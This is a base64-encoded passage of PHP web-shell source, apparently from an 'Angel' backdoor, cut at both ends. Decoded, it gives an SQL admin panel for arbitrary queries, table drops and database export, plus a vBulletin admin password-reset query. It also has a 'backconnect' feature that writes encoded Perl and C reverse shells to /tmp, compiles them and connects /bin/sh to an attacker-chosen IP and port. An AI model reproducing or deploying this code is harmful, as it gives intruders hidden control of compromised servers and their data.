YSBocmVmPSJqYXZhc2NyaXB0OnNldHRhYmxlKFwnJy4kdGFibGVuYW1lLidcJywgXCdkcm9wXCcpOyI+RHJvcDwvYT4gXScpOwoJCQl9CgkJCXAoJzwvcD4nKTsKCQkJbXlzcWxfc2VsZWN0X2RiKCRkYm5hbWUpOwoKCQkJJGdldG51bXNxbCA9ICcnOwoJCQkkcnVucXVlcnkgPSAwOwoJCQlpZiAoJHNxbF9xdWVyeSkgewoJCQkJJHJ1bnF1ZXJ5ID0gMTsKCQkJfQoJCQkkYWxsb3dlZGl0ID0gMDsKCQkJaWYgKCR0YWJsZW5hbWUgJiYgISRzcWxfcXVlcnkpIHsKCQkJCSRzcWxfcXVlcnkgPSAiU0VMRUNUICogRlJPTSAkdGFibGVuYW1lIjsKCQkJCSRnZXRudW1zcWwgPSAkc3FsX3F1ZXJ5OwoJCQkJJHNxbF9xdWVyeSA9ICRzcWxfcXVlcnkuIiBMSU1JVCAkc3RhcnRfbGltaXQsICRwYWdlbnVtIjsKCQkJCSRhbGxvd2VkaXQgPSAxOwoJCQl9CgkJCXAoJzxmb3JtIGFjdGlvbj0iJy4kc2VsZi4nIiBtZXRob2Q9IlBPU1QiPicpOwoJCQlwKCc8cD48dGFibGUgd2lkdGg9IjIwMCIgYm9yZGVyPSIwIiBjZWxscGFkZGluZz0iMCIgY2VsbHNwYWNpbmc9IjAiPjx0cj48dGQgY29sc3Bhbj0iMiI+UnVuIFNRTCBxdWVyeS9xdWVyaWVzIG9uIGRhdGFiYXNlIDxmb250IGNvbG9yPXJlZD48Yj4nLiRkYm5hbWUuJzwvZm9udD48L2I+OjxCUj5FeGFtcGxlIFZCQiBQYXNzd29yZDogPGZvbnQgY29sb3I9cmVkPnZiYXRlYW08L2ZvbnQ+PEJSPjxmb250IGNvbG9yPXllbGxvdz5VUERBVEUgYHVzZXJgIFNFVCBgcGFzc3dvcmRgID0gXCc2OWU1M2U1YWI5NTM2ZTU1ZDMxZmY1MzNhZWZjNGZiZVwnLCBzYWx0ID0gXCdwNVRcJyBXSEVSRSBgdXNlcmlkYCA9IFwnMVwnIDwvZm9udD4KCQkJPC90ZD48L3RyPjx0cj48dGQ+PHRleHRhcmVhIG5hbWU9InNxbF9xdWVyeSIgY2xhc3M9ImFyZWEiIHN0eWxlPSJ3aWR0aDo2MDBweDtoZWlnaHQ6NTBweDtvdmVyZmxvdzphdXRvOyI+Jy5odG1sc3BlY2lhbGNoYXJzKCRzcWxfcXVlcnksRU5UX1FVT1RFUykuJzwvdGV4dGFyZWE+PC90ZD48dGQgc3R5bGU9InBhZGRpbmc6MCA1cHg7Ij48aW5wdXQgY2xhc3M9ImJ0IiBzdHlsZT0iaGVpZ2h0OjUwcHg7IiBuYW1lPSJzdWJtaXQiIHR5cGU9InN1Ym1pdCIgdmFsdWU9IlF1ZXJ5IiAvPjwvdGQ+PC90cj48L3RhYmxlPjwvcD4nKTsKCQkJbWFrZWhpZGUoJ3RhYmxlbmFtZScsICR0YWJsZW5hbWUpOwoJCQltYWtlaGlkZSgnYWN0aW9uJywnc3FsYWRtaW4nKTsKCQkJcCgkZGJmb3JtKTsKCQkJcCgnPC9mb3JtPicpOwoJCQlpZiAoJHRhYmxlbmFtZSB8fCAoJHJ1bnF1ZXJ5ICYmICRzcWxfcXVlcnkpKSB7CgkJCQlpZiAoJGRvaW5nID09ICdzdHJ1Y3R1cmUnKSB7CgkJCQkJJHJlc3VsdCA9IHEoIlNIT1cgQ09MVU1OUyBGUk9NICR0YWJsZW5hbWUiKTsKCQkJCQkkcm93ZGIgPSBhcnJheSgpOwoJCQkJCXdoaWxlKCRyb3cgPSBteXNxbF9mZXRjaF9hcnJheSgkcmVzdWx0KSkgewoJCQkJCQkkcm93ZGJbXSA9ICRyb3c7CgkJCQkJfQoJCQkJCXAoJzx0YWJsZSBib3JkZXI9IjAiIGNlbGxwYWRkaW5nPSIzIiBjZWxsc3BhY2luZz0iMCI+Jyk7CgkJCQkJcCgnPHRyIGNsYXNzPSJoZWFkIj4nKTsKCQkJCQlwKCc8dGQ+RmllbGQ8L3RkPicpOwoJCQkJCXAoJzx0ZD5UeXBlPC90ZD4nKTsKCQkJCQlwKCc8dGQ+TnVsbDwvdGQ+Jyk7CgkJCQkJcCgnPHRkPktleTwvdGQ+Jyk7CgkJCQkJcCgnPHRkPkRlZmF1bHQ8L3RkPicpOwoJCQkJCXAoJzx0ZD5FeHRyYTwvdGQ+Jyk7CgkJCQkJcCgnPC90cj4nKTsKCQkJCQlmb3JlYWNoICgkcm93ZGIgYXMgJHJvdykgewoJCQkJCQkkdGhpc2JnID0gYmcoKTsKCQkJCQkJcCgnPHRyIGNsYXNzPSJmb3V0IiBvbm1vdXNlb3Zlcj0idGhpcy5jbGFzc05hbWU9XCdmb2N1c1wnOyIgb25tb3VzZW91dD0idGhpcy5jbGFzc05hbWU9XCdmb3V0XCc7Ij4nKTsKCQkJCQkJcCgnPHRkPicuJHJvd1snRmllbGQnXS4nPC90ZD4nKTsKCQkJCQkJcCgnPHRkPicuJHJvd1snVHlwZSddLic8L3RkPicpOwoJCQkJCQlwKCc8dGQ+Jy4kcm93WydOdWxsJ10uJyZuYnNwOzwvdGQ+Jyk7CgkJCQkJCXAoJzx0ZD4nLiRyb3dbJ0tleSddLicmbmJzcDs8L3RkPicpOwoJCQkJCQlwKCc8dGQ+Jy4kcm93WydEZWZhdWx0J10uJyZuYnNwOzwvdGQ+Jyk7CgkJCQkJCXAoJzx0ZD4nLiRyb3dbJ0V4dHJhJ10uJyZuYnNwOzwvdGQ+Jyk7CgkJCQkJCXAoJzwvdHI+Jyk7CgkJCQkJfQoJCQkJCXRiZm9vdCgpOwoJCQkJfSBlbHNlaWYgKCRkb2luZyA9PSAnaW5zZXJ0JyB8fCAkZG9pbmcgPT0gJ2VkaXQnKSB7CgkJCQkJJHJlc3VsdCA9IHEoJ1NIT1cgQ09MVU1OUyBGUk9NICcuJHRhYmxlbmFtZSk7CgkJCQkJd2hpbGUgKCRyb3cgPSBteXNxbF9mZXRjaF9hcnJheSgkcmVzdWx0KSkgewoJCQkJCQkkcm93ZGJbXSA9ICRyb3c7CgkJCQkJfQoJCQkJCSRycyA9IGFycmF5KCk7CgkJCQkJaWYgKCRkb2luZyA9PSAnaW5zZXJ0JykgewoJCQkJCQlwKCc8aDI+SW5zZXJ0IG5ldyBsaW5lIGluICcuJHRhYmxlbmFtZS4nIHRhYmxlICZyYXF1bzs8L2gyPicpOwoJCQkJCX0gZWxzZSB7CgkJCQkJCXAoJzxoMj5VcGRhdGUgcmVjb3JkIGluICcuJHRhYmxlbmFtZS4nIHRhYmxlICZyYXF1bzs8L2gyPicpOwoJCQkJCQkkd2hlcmUgPSBiYXNlNjRfZGVjb2RlKCRiYXNlNjQpOwoJCQkJCQkkcmVzdWx0ID0gcSgiU0VMRUNUICogRlJPTSAkdGFibGVuYW1lIFdIRVJFICR3aGVyZSBMSU1JVCAxIik7CgkJCQkJCSRycyA9IG15c3FsX2ZldGNoX2FycmF5KCRyZXN1bHQpOwoJCQkJCX0KCQkJCQlwKCc8Zm9ybSBtZXRob2Q9InBvc3QiIGFjdGlvbj0iJy4kc2VsZi4nIj4nKTsKCQkJCQlwKCRkYmZvcm0pOwoJCQkJCW1ha2VoaWRlKCdhY3Rpb24nLCdzcWxhZG1pbicpOwoJCQkJCW1ha2VoaWRlKCd0YWJsZW5hbWUnLCR0YWJsZW5hbWUpOwoJCQkJCXAoJzx0YWJsZSBib3JkZXI9IjAiIGNlbGxwYWRkaW5nPSIzIiBjZWxsc3BhY2luZz0iMCI+Jyk7CgkJCQkJZm9yZWFjaCAoJHJvd2RiIGFzICRyb3cpIHsKCQkJCQkJaWYgKCRyc1skcm93WydGaWVsZCddXSkgewoJCQkJCQkJJHZhbHVlID0gaHRtbHNwZWNpYWxjaGFycygkcnNbJHJvd1snRmllbGQnXV0pOwoJCQkJCQl9IGVsc2UgewoJCQkJCQkJJHZhbHVlID0gJyc7CgkJCQkJCX0KCQkJCQkJJHRoaXNiZyA9IGJnKCk7CgkJCQkJCXAoJzx0ciBjbGFzcz0iZm91dCIgb25tb3VzZW92ZXI9InRoaXMuY2xhc3NOYW1lPVwnZm9jdXNcJzsiIG9ubW91c2VvdXQ9InRoaXMuY2xhc3NOYW1lPVwnZm91dFwnOyI+Jyk7CgkJCQkJCXAoJzx0ZD48Yj4nLiRyb3dbJ0ZpZWxkJ10uJzwvYj48YnIgLz4nLiRyb3dbJ1R5cGUnXS4nPC90ZD48dGQ+PHRleHRhcmVhIGNsYXNzPSJhcmVhIiBuYW1lPSJpbnNlcnRzcWxbJy4kcm93WydGaWVsZCddLiddIiBzdHlsZT0id2lkdGg6NTAwcHg7aGVpZ2h0OjYwcHg7b3ZlcmZsb3c6YXV0bzsiPicuJHZhbHVlLic8L3RleHRhcmVhPjwvdGQ+PC90cj4nKTsKCQkJCQl9CgkJCQkJaWYgKCRkb2luZyA9PSAnaW5zZXJ0JykgewoJCQkJCQlwKCc8dHIgY2xhc3M9ImZvdXQiPjx0ZCBjb2xzcGFuPSIyIj48aW5wdXQgY2xhc3M9ImJ0IiB0eXBlPSJzdWJtaXQiIG5hbWU9Imluc2VydCIgdmFsdWU9Ikluc2VydCIgLz48L3RkPjwvdHI+Jyk7CgkJCQkJfSBlbHNlIHsKCQkJCQkJcCgnPHRyIGNsYXNzPSJmb3V0Ij48dGQgY29sc3Bhbj0iMiI+PGlucHV0IGNsYXNzPSJidCIgdHlwZT0ic3VibWl0IiBuYW1lPSJ1cGRhdGUiIHZhbHVlPSJVcGRhdGUiIC8+PC90ZD48L3RyPicpOwoJCQkJCQltYWtlaGlkZSgnYmFzZTY0JywgJGJhc2U2NCk7CgkJCQkJfQoJCQkJCXAoJzwvdGFibGU+PC9mb3JtPicpOwoJCQkJfSBlbHNlIHsKCQkJCQkkcXVlcnlzID0gQGV4cGxvZGUoJzsnLCRzcWxfcXVlcnkpOwoJCQkJCWZvcmVhY2goJHF1ZXJ5cyBhcyAkbnVtPT4kcXVlcnkpIHsKCQkJCQkJaWYgKCRxdWVyeSkgewoJCQkJCQkJcCgiPHA+PGI+UXVlcnkjeyRudW19IDogIi5odG1sc3BlY2lhbGNoYXJzKCRxdWVyeSxFTlRfUVVPVEVTKS4iPC9iPjwvcD4iKTsKCQkJCQkJCXN3aXRjaChxeSgkcXVlcnkpKQoJCQkJCQkJewoJCQkJCQkJCWNhc2UgMDoKCQkJCQkJCQkJcCgnPGgyPkVycm9yIDogJy5teXNxbF9lcnJvcigpLic8L2gyPicpOwoJCQkJCQkJCQlicmVhazsKCQkJCQkJCQljYXNlIDE6CgkJCQkJCQkJCWlmIChzdHJ0b2xvd2VyKHN1YnN0cigkcXVlcnksMCwxMykpID09ICdzZWxlY3QgKiBmcm9tJykgewoJCQkJCQkJCQkJJGFsbG93ZWRpdCA9IDE7CgkJCQkJCQkJCX0KCQkJCQkJCQkJaWYgKCRnZXRudW1zcWwpIHsKCQkJCQkJCQkJCSR0YXRvbCA9IG15c3FsX251bV9yb3dzKHEoJGdldG51bXNxbCkpOwoJCQkJCQkJCQkJJG11bHRpcGFnZSA9IG11bHRpKCR0YXRvbCwgJHBhZ2VudW0sICRwYWdlLCAkdGFibGVuYW1lKTsKCQkJCQkJCQkJfQoJCQkJCQkJCQlpZiAoISR0YWJsZW5hbWUpIHsKCQkJCQkJCQkJCSRzcWxfbGluZSA9IHN0cl9yZXBsYWNlKGFycmF5KCJcciIsICJcbiIsICJcdCIpLCBhcnJheSgnICcsICcgJywgJyAnKSwgdHJpbShodG1sc3BlY2lhbGNoYXJzKCRxdWVyeSkpKTsKCQkJCQkJCQkJCSRzcWxfbGluZSA9IHByZWdfcmVwbGFjZSgiL1wvXCpbXihcKlwvKV0qXCpcLy9pIiwgIiAiLCAkc3FsX2xpbmUpOwoJCQkJCQkJCQkJcHJlZ19tYXRjaF9hbGwoIi9mcm9tXHMrYHswLDF9KFtcd10rKWB7MCwxfVxzKy9pIiwkc3FsX2xpbmUsJG1hdGNoZXMpOwoJCQkJCQkJCQkJJHRhYmxlbmFtZSA9ICRtYXRjaGVzWzFdWzBdOwoJCQkJCQkJCQl9CgkJCQkJCQkJCSRyZXN1bHQgPSBxKCRxdWVyeSk7CgkJCQkJCQkJCXAoJG11bHRpcGFnZSk7CgkJCQkJCQkJCXAoJzx0YWJsZSBib3JkZXI9IjAiIGNlbGxwYWRkaW5nPSIzIiBjZWxsc3BhY2luZz0iMCI+Jyk7CgkJCQkJCQkJCXAoJzx0ciBjbGFzcz0iaGVhZCI+Jyk7CgkJCQkJCQkJCWlmICgkYWxsb3dlZGl0KSBwKCc8dGQ+QWN0aW9uPC90ZD4nKTsKCQkJCQkJCQkJJGZpZWxkbnVtID0gQG15c3FsX251bV9maWVsZHMoJHJlc3VsdCk7CgkJCQkJCQkJCWZvcigkaT0wOyRpPCRmaWVsZG51bTskaSsrKXsKCQkJCQkJCQkJCSRuYW1lID0gQG15c3FsX2ZpZWxkX25hbWUoJHJlc3VsdCwgJGkpOwoJCQkJCQkJCQkJJHR5cGUgPSBAbXlzcWxfZmllbGRfdHlwZSgkcmVzdWx0LCAkaSk7CgkJCQkJCQkJCQkkbGVuID0gQG15c3FsX2ZpZWxkX2xlbigkcmVzdWx0LCAkaSk7CgkJCQkJCQkJCQlwKCI8dGQgbm93cmFwPiRuYW1lPGJyPjxzcGFuPiR0eXBlKCRsZW4pPC9zcGFuPjwvdGQ+Iik7CgkJCQkJCQkJCX0KCQkJCQkJCQkJcCgnPC90cj4nKTsKCQkJCQkJCQkJd2hpbGUoJG1uID0gQG15c3FsX2ZldGNoX2Fzc29jKCRyZXN1bHQpKXsKCQkJCQkJCQkJCSR0aGlzYmcgPSBiZygpOwoJCQkJCQkJCQkJcCgnPHRyIGNsYXNzPSJmb3V0IiBvbm1vdXNlb3Zlcj0idGhpcy5jbGFzc05hbWU9XCdmb2N1c1wnOyIgb25tb3VzZW91dD0idGhpcy5jbGFzc05hbWU9XCdmb3V0XCc7Ij4nKTsKCQkJCQkJCQkJCSR3aGVyZSA9ICR0bXAgPSAkYjEgPSAnJzsKCQkJCQkJCQkJCWZvcmVhY2goJG1uIGFzICRrZXk9PiRpbnNpZGUpewoJCQkJCQkJCQkJCWlmICgkaW5zaWRlKSB7CgkJCQkJCQkJCQkJCSR3aGVyZSAuPSAkdG1wLiRrZXkuIj0nIi5hZGRzbGFzaGVzKCRpbnNpZGUpLiInIjsKCQkJCQkJCQkJCQkJJHRtcCA9ICcgQU5EICc7CgkJCQkJCQkJCQkJfQoJCQkJCQkJCQkJCSRiMSAuPSAnPHRkIG5vd3JhcD4nLmh0bWxfY2xlYW4oJGluc2lkZSkuJyZuYnNwOzwvdGQ+JzsKCQkJCQkJCQkJCX0KCQkJCQkJCQkJCSR3aGVyZSA9IGJhc2U2NF9lbmNvZGUoJHdoZXJlKTsKCQkJCQkJCQkJCWlmICgkYWxsb3dlZGl0KSBwKCc8dGQgbm93cmFwPjxhIGhyZWY9ImphdmFzY3JpcHQ6ZWRpdHJlY29yZChcJ2VkaXRcJywgXCcnLiR3aGVyZS4nXCcsIFwnJy4kdGFibGVuYW1lLidcJyk7Ij5FZGl0PC9hPiB8IDxhIGhyZWY9ImphdmFzY3JpcHQ6ZWRpdHJlY29yZChcJ2RlbFwnLCBcJycuJHdoZXJlLidcJywgXCcnLiR0YWJsZW5hbWUuJ1wnKTsiPkRlbDwvYT48L3RkPicpOwoJCQkJCQkJCQkJcCgkYjEpOwoJCQkJCQkJCQkJcCgnPC90cj4nKTsKCQkJCQkJCQkJCXVuc2V0KCRiMSk7CgkJCQkJCQkJCX0KCQkJCQkJCQkJdGJmb290KCk7CgkJCQkJCQkJCXAoJG11bHRpcGFnZSk7CgkJCQkJCQkJCWJyZWFrOwoJCQkJCQkJCWNhc2UgMjoKCQkJCQkJCQkJJGFyID0gbXlzcWxfYWZmZWN0ZWRfcm93cygpOwoJCQkJCQkJCQlwKCc8aDI+YWZmZWN0ZWQgcm93cyA6IDxiPicuJGFyLic8L2I+PC9oMj4nKTsKCQkJCQkJCQkJYnJlYWs7CgkJCQkJCQl9CgkJCQkJCX0KCQkJCQl9CgkJCQl9CgkJCX0gZWxzZSB7CgkJCQkkcXVlcnkgPSBxKCJTSE9XIFRBQkxFIFNUQVRVUyIpOwoJCQkJJHRhYmxlX251bSA9ICR0YWJsZV9yb3dzID0gJGRhdGFfc2l6ZSA9IDA7CgkJCQkkdGFibGVkYiA9IGFycmF5KCk7CgkJCQl3aGlsZSgkdGFibGUgPSBteXNxbF9mZXRjaF9hcnJheSgkcXVlcnkpKSB7CgkJCQkJJGRhdGFfc2l6ZSA9ICRkYXRhX3NpemUgKyAkdGFibGVbJ0RhdGFfbGVuZ3RoJ107CgkJCQkJJHRhYmxlX3Jvd3MgPSAkdGFibGVfcm93cyArICR0YWJsZVsnUm93cyddOwoJCQkJCSR0YWJsZVsnRGF0YV9sZW5ndGgnXSA9IHNpemVjb3VudCgkdGFibGVbJ0RhdGFfbGVuZ3RoJ10pOwoJCQkJCSR0YWJsZV9udW0rKzsKCQkJCQkkdGFibGVkYltdID0gJHRhYmxlOwoJCQkJfQoJCQkJJGRhdGFfc2l6ZSA9IHNpemVjb3VudCgkZGF0YV9zaXplKTsKCQkJCXVuc2V0KCR0YWJsZSk7CgkJCQlwKCc8dGFibGUgYm9yZGVyPSIwIiBjZWxscGFkZGluZz0iMCIgY2VsbHNwYWNpbmc9IjAiPicpOwoJCQkJcCgnPGZvcm0gYWN0aW9uPSInLiRzZWxmLiciIG1ldGhvZD0iUE9TVCI+Jyk7CgkJCQltYWtlaGlkZSgnYWN0aW9uJywnc3FsYWRtaW4nKTsKCQkJCXAoJGRiZm9ybSk7CgkJCQlwKCc8dHIgY2xhc3M9ImhlYWQiPicpOwoJCQkJcCgnPHRkIHdpZHRoPSIyJSIgYWxpZ249ImNlbnRlciI+PGlucHV0IG5hbWU9ImNoa2FsbCIgdmFsdWU9Im9uIiB0eXBlPSJjaGVja2JveCIgb25jbGljaz0iQ2hlY2tBbGwodGhpcy5mb3JtKSIgLz48L3RkPicpOwoJCQkJcCgnPHRkPk5hbWU8L3RkPicpOwoJCQkJcCgnPHRkPlJvd3M8L3RkPicpOwoJCQkJcCgnPHRkPkRhdGFfbGVuZ3RoPC90ZD4nKTsKCQkJCXAoJzx0ZD5DcmVhdGVfdGltZTwvdGQ+Jyk7CgkJCQlwKCc8dGQ+VXBkYXRlX3RpbWU8L3RkPicpOwoJCQkJaWYgKCRoaWdodmVyKSB7CgkJCQkJcCgnPHRkPkVuZ2luZTwvdGQ+Jyk7CgkJCQkJcCgnPHRkPkNvbGxhdGlvbjwvdGQ+Jyk7CgkJCQl9CgkJCQlwKCc8L3RyPicpOwoJCQkJZm9yZWFjaCAoJHRhYmxlZGIgYXMgJGtleSA9PiAkdGFibGUpIHsKCQkJCQkkdGhpc2JnID0gYmcoKTsKCQkJCQlwKCc8dHIgY2xhc3M9ImZvdXQiIG9ubW91c2VvdmVyPSJ0aGlzLmNsYXNzTmFtZT1cJ2ZvY3VzXCc7IiBvbm1vdXNlb3V0PSJ0aGlzLmNsYXNzTmFtZT1cJ2ZvdXRcJzsiPicpOwoJCQkJCXAoJzx0ZCBhbGlnbj0iY2VudGVyIiB3aWR0aD0iMiUiPjxpbnB1dCB0eXBlPSJjaGVja2JveCIgbmFtZT0idGFibGVbXSIgdmFsdWU9IicuJHRhYmxlWydOYW1lJ10uJyIgLz48L3RkPicpOwoJCQkJCXAoJzx0ZD48YSBocmVmPSJqYXZhc2NyaXB0OnNldHRhYmxlKFwnJy4kdGFibGVbJ05hbWUnXS4nXCcpOyI+Jy4kdGFibGVbJ05hbWUnXS4nPC9hPiBbIDxhIGhyZWY9ImphdmFzY3JpcHQ6c2V0dGFibGUoXCcnLiR0YWJsZVsnTmFtZSddLidcJywgXCdpbnNlcnRcJyk7Ij5JbnNlcnQ8L2E+IHwgPGEgaHJlZj0iamF2YXNjcmlwdDpzZXR0YWJsZShcJycuJHRhYmxlWydOYW1lJ10uJ1wnLCBcJ3N0cnVjdHVyZVwnKTsiPlN0cnVjdHVyZTwvYT4gfCA8YSBocmVmPSJqYXZhc2NyaXB0OnNldHRhYmxlKFwnJy4kdGFibGVbJ05hbWUnXS4nXCcsIFwnZHJvcFwnKTsiPkRyb3A8L2E+IF08L3RkPicpOwoJCQkJCXAoJzx0ZD4nLiR0YWJsZVsnUm93cyddLic8L3RkPicpOwoJCQkJCXAoJzx0ZD4nLiR0YWJsZVsnRGF0YV9sZW5ndGgnXS4nPC90ZD4nKTsKCQkJCQlwKCc8dGQ+Jy4kdGFibGVbJ0NyZWF0ZV90aW1lJ10uJzwvdGQ+Jyk7CgkJCQkJcCgnPHRkPicuJHRhYmxlWydVcGRhdGVfdGltZSddLic8L3RkPicpOwoJCQkJCWlmICgkaGlnaHZlcikgewoJCQkJCQlwKCc8dGQ+Jy4kdGFibGVbJ0VuZ2luZSddLic8L3RkPicpOwoJCQkJCQlwKCc8dGQ+Jy4kdGFibGVbJ0NvbGxhdGlvbiddLic8L3RkPicpOwoJCQkJCX0KCQkJCQlwKCc8L3RyPicpOwoJCQkJfQoJCQkJcCgnPHRyIGNsYXNzPWZvdXQ+Jyk7CgkJCQlwKCc8dGQ+Jm5ic3A7PC90ZD4nKTsKCQkJCXAoJzx0ZD5Ub3RhbCB0YWJsZXM6ICcuJHRhYmxlX251bS4nPC90ZD4nKTsKCQkJCXAoJzx0ZD4nLiR0YWJsZV9yb3dzLic8L3RkPicpOwoJCQkJcCgnPHRkPicuJGRhdGFfc2l6ZS4nPC90ZD4nKTsKCQkJCXAoJzx0ZCBjb2xzcGFuPSInLigkaGlnaHZlciA/IDQgOiAyKS4nIj4mbmJzcDs8L3RkPicpOwoJCQkJcCgnPC90cj4nKTsKCgkJCQlwKCI8dHIgY2xhc3M9XCJmb3V0XCI+PHRkIGNvbHNwYW49XCIiLigkaGlnaHZlciA/IDggOiA2KS4iXCI+PGlucHV0IG5hbWU9XCJzYXZlYXNmaWxlXCIgdmFsdWU9XCIxXCIgdHlwZT1cImNoZWNrYm94XCIgLz4gU2F2ZSBhcyBmaWxlIDxpbnB1dCBjbGFzcz1cImlucHV0XCIgbmFtZT1cInBhdGhcIiB2YWx1ZT1cIiIuU0FfUk9PVC4kX1NFUlZFUlsnSFRUUF9IT1NUJ10uIl9NeVNRTC5zcWxcIiB0eXBlPVwidGV4dFwiIHNpemU9XCI2MFwiIC8+IDxpbnB1dCBjbGFzcz1cImJ0XCIgdHlwZT1cInN1Ym1pdFwiIG5hbWU9XCJkb3ducmFyXCIgdmFsdWU9XCJFeHBvcnQgc2VsZWN0aW9uIHRhYmxlXCIgLz48L3RkPjwvdHI+Iik7CgkJCQltYWtlaGlkZSgnZG9pbmcnLCdiYWNrdXBteXNxbCcpOwoJCQkJZm9ybWZvb3QoKTsKCQkJCXAoIjwvdGFibGU+Iik7CgkJCQlmcigkcXVlcnkpOwoJCQl9CgkJfQoJfQoJdGJmb290KCk7CglAbXlzcWxfY2xvc2UoKTsKfS8vZW5kIHNxbCBiYWNrdXAKCgplbHNlaWYgKCRhY3Rpb24gPT0gJ2JhY2tjb25uZWN0JykgewoJISR5b3VyaXAgJiYgJHlvdXJpcCA9ICRfU0VSVkVSWydSRU1PVEVfQUREUiddOwoJISR5b3VycG9ydCAmJiAkeW91cnBvcnQgPSAnMTIzNDUnOwoJJHVzZWRiID0gYXJyYXkoJ3BlcmwnPT4ncGVybCcsJ2MnPT4nYycpOwoKCSRiYWNrX2Nvbm5lY3Q9Ikl5RXZkWE55TDJKcGJpOXdaWEpzRFFwMWMyVWdVMjlqYTJWME93MEtKR050WkQwZ0lteDVibmdpT3cwS0pITjVjM1JsYlQwZ0oyVmphRzhnSW1CMWJtRnRaU0F0WVdBaU8yVmoiLgoJCSJhRzhnSW1CcFpHQWlPeTlpYVc0dmMyZ25PdzBLSkRBOUpHTnRaRHNOQ2lSMFlYSm5aWFE5SkVGU1IxWmJNRjA3RFFva2NHOXlkRDBrUVZKSFZsc3hYVHNOQ2lScFlXUmtjajFwYm1WMFgyRjBiMjRvSkhSIi4KCQkiaGNtZGxkQ2tnZkh3Z1pHbGxLQ0pGY25KdmNqb2dKQ0ZjYmlJcE93MEtKSEJoWkdSeVBYTnZZMnRoWkdSeVgybHVLQ1J3YjNKMExDQWthV0ZrWkhJcElIeDhJR1JwWlNnaVJYSnliM0k2SUNRaFhHNGlLVCIuCgkJInNOQ2lSd2NtOTBiejFuWlhSd2NtOTBiMko1Ym1GdFpTZ25kR053SnlrN0RRcHpiMk5yWlhRb1UwOURTMFZVTENCUVJsOUpUa1ZVTENCVFQwTkxYMU5VVWtWQlRTd2dKSEJ5YjNSdktTQjhmQ0JrYVdVb0kiLgoJCSJrVnljbTl5T2lBa0lWeHVJaWs3RFFwamIyNXVaV04wS0ZOUFEwdEZWQ3dnSkhCaFpHUnlLU0I4ZkNCa2FXVW9Ja1Z5Y205eU9pQWtJVnh1SWlrN0RRcHZjR1Z1S0ZOVVJFbE9MQ0FpUGlaVFQwTkxSVlFpIi4KCQkiS1RzTkNtOXdaVzRvVTFSRVQxVlVMQ0FpUGlaVFQwTkxSVlFpS1RzTkNtOXdaVzRvVTFSRVJWSlNMQ0FpUGlaVFQwTkxSVlFpS1RzTkNuTjVjM1JsYlNna2MzbHpkR1Z0S1RzTkNtTnNiM05sS0ZOVVJFbCIuCgkJIk9LVHNOQ21Oc2IzTmxLRk5VUkU5VlZDazdEUXBqYkc5elpTaFRWRVJGVWxJcE93PT0iOwoJJGJhY2tfY29ubmVjdF9jPSJJMmx1WTJ4MVpHVWdQSE4wWkdsdkxtZytEUW9qYVc1amJIVmtaU0E4YzNsekwzTnZZMnRsZEM1b1BnMEtJMmx1WTJ4MVpHVWdQRzVsZEdsdVpYUXZhVzR1YUQ0TkNtbHVkQyIuCgkJIkJ0WVdsdUtHbHVkQ0JoY21kakxDQmphR0Z5SUNwaGNtZDJXMTBwRFFwN0RRb2dhVzUwSUdaa093MEtJSE4wY25WamRDQnpiMk5yWVdSa2NsOXBiaUJ6YVc0N0RRb2dZMmhoY2lCeWJYTmJNakZkUFNKeWIiLgoJCSJTQXRaaUFpT3lBTkNpQmtZV1Z0YjI0b01Td3dLVHNOQ2lCemFXNHVjMmx1WDJaaGJXbHNlU0E5SUVGR1gwbE9SVlE3RFFvZ2MybHVMbk5wYmw5d2IzSjBJRDBnYUhSdmJuTW9ZWFJ2YVNoaGNtZDJXekpkIi4KCQkiS1NrN0RRb2djMmx1TG5OcGJsOWhaR1J5TG5OZllXUmtjaUE5SUdsdVpYUmZZV1JrY2loaGNtZDJXekZkS1RzZ0RRb2dZbnBsY204b1lYSm5kbHN4WFN4emRISnNaVzRvWVhKbmRsc3hYU2tyTVN0emRISiIuCgkJInNaVzRvWVhKbmRsc3lYU2twT3lBTkNpQm1aQ0E5SUhOdlkydGxkQ2hCUmw5SlRrVlVMQ0JUVDBOTFgxTlVVa1ZCVFN3Z1NWQlFVazlVVDE5VVExQXBJRHNnRFFvZ2FXWWdLQ2hqYjI1dVpXTjBLR1prTEMiLgoJCSJBb2MzUnlkV04wSUhOdlkydGhaR1J5SUNvcElDWnphVzRzSUhOcGVtVnZaaWh6ZEhKMVkzUWdjMjlqYTJGa1pISXBLU2s4TUNrZ2V3MEtJQ0FnY0dWeWNtOXlLQ0piTFYwZ1kyOXVibVZqZENncElpazdEIi4KCQkiUW9nSUNCbGVHbDBLREFwT3cwS0lIME5DaUJ6ZEhKallYUW9jbTF6TENCaGNtZDJXekJkS1RzTkNpQnplWE4wWlcwb2NtMXpLVHNnSUEwS0lHUjFjRElvWm1Rc0lEQXBPdzBLSUdSMWNESW9abVFzSURFcCIuCgkJIk93MEtJR1IxY0RJb1ptUXNJRElwT3cwS0lHVjRaV05zS0NJdlltbHVMM05vSWl3aWMyZ2dMV2tpTENCT1ZVeE1LVHNOQ2lCamJHOXpaU2htWkNrN0lBMEtmUT09IjsKCglpZiAoJHN0YXJ0ICYmICR5b3VyaXAgJiYgJHlvdXJwb3J0ICYmICR1c2UpewoJCWlmICgkdXNlID09ICdwZXJsJykgewoJCQljZignL3RtcC9hbmdlbF9iYycsJGJhY2tfY29ubmVjdCk7CgkJCSRyZXMgPSBleGVjdXRlKHdoaWNoKCdwZXJsJykuIiAvdG1wL2FuZ2VsX2JjICR5b3VyaXAgJHlvdXJwb3J0ICYiKTsKCQl9IGVsc2UgewoJCQljZignL3RtcC9hbmdlbF9iYy5jJywkYmFja19jb25uZWN0X2MpOwoJCQkkcmVzID0gZXhlY3V0ZSgnZ2NjIC1vIC90bXAvYW5nZWxfYmMgL3RtcC9hbmdlbF9iYy5jJyk7CgkJCUB1bmxpbmsoJy90bXAvYW5nZWxfYmMuYycpOwoJCQkkcmVzID0gZXhlY3V0ZSgiL3RtcC9hbmdlbF9iYyAkeW91cmlwICR5b3VycG9ydCAmIik7CgkJfQoJCW0oIk5vdyBzY3JpcHQgdHJ5IGNvbm5lY3QgdG8gJHlvdXJpcCBwb3J0ICR5b3VycG9ydCAuLi4iKTsKCX0KCglmb3JtaGVhZChhcnJheSgndGl0bGUnPT4nQmFjayBDb25uZWN0JykpOwoJbWFrZWhpZGUoJ2FjdGlvbicsJ2JhY2tjb25uZWN0Jyk7CglwKCc8cD4nKTsKCXAoJ1lvdXIgSVA6Jyk7CgltYWtlaW5wdXQoYXJyYXkoJ25hbWUnPT4neW91cmlwJywnc2l6ZSc9PjIwLCd2YWx1ZSc9PiR5b3VyaXApKTsKCXAoJ1lvdXIgUG9ydDonKTsKCW1ha2VpbnB1dC